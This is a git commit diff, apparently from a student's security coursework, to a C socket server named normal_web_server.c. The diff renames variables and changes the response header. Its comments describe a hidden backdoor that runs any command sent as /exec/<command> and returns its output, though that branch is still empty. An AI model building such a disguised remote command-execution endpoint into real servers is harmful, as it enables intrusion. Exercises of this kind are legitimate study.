bea4ca307d2c409f337d67cc62bce5a6bd376428
Austen Mack <austen.mack@asu.edu>
2021-01-18 14:24:51 -0700

    response header visible in browser

--- normal_web_server.c
+++ normal_web_server.c
@@ -11,30 +11,33 @@ int main(int argc, char *argv[]) {
     int port = atoi(argv[1]);
 
     //Create socket, define address, bind to address, listen to port
-    int mah_socket;
-    mah_socket = socket(PF_INET, SOCK_STREAM, 0);
+    int server_socket;
+    server_socket = socket(PF_INET, SOCK_STREAM, 0);
 
     struct sockaddr_in server_address;
     server_address.sin_family = AF_INET;
     server_address.sin_port = htons(port);
     server_address.sin_addr.s_addr = INADDR_ANY;
 
-    bind(mah_socket, (struct sockaddr *) &server_address, sizeof(server_address));
+    bind(server_socket, (struct sockaddr *) &server_address, sizeof(server_address));
 
-    listen(mah_socket, 1);    
+    listen(server_socket, 1);    
     
     //GET requests of valid URL format get 404
     //GET requests with URL of form /exec/<command> execute it using libc function
     //HTTP response is stdout of executed command, status code 200
     //No limit on characters, be able to handle anything
 
+    //DOUBLE CHECK THIS HEADER FOR ACCURACY RE: RFC2616
     char *normal_response_header =
-        "HTTP/1.1 404 Not Found\r\n"
-        "Content-Type: text/html\r\n";
+        "HTTP/1.1 200 OK\r\n"
+        "Content-Type: text/html\r\n"
+        "\r\n"
+        "<html><body>Too bad so sad, baby!</body></html>";
 
     int client_socket;
     while(1) {
-        client_socket = accept(mah_socket, NULL, NULL);
+        client_socket = accept(server_socket, NULL, NULL);
         //if backdoor request
         
         //else
